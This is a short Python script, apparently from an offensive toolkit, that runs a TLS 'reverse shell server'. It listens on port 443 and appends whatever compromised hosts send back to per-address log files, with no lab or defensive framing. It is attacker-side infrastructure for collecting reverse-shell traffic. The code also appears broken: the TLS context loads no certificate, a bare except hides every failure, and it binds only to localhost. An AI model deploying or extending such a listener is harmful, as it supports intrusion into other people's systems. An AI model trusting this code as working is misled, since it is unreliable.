import socket
import ssl
from TheSilent.clear import clear

def reverse_shell_server():
    clear()
    print("listening on port 443")
    while True:
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
                sock.bind(("127.0.0.1", 443))
                sock.listen(5)
                with context.wrap_socket(sock, server_side=True) as secure_sock:
                    while True:
                        conn, addr = secure_sock.accept()
                        data = conn.recv(65536)
                        if len(data) > 0:
                            with open(f"reverse_shell_data_{addr[0]}.txt", "a") as file:
                                file.write(str(data) + "\n")

        except:
            continue

reverse_shell_server()
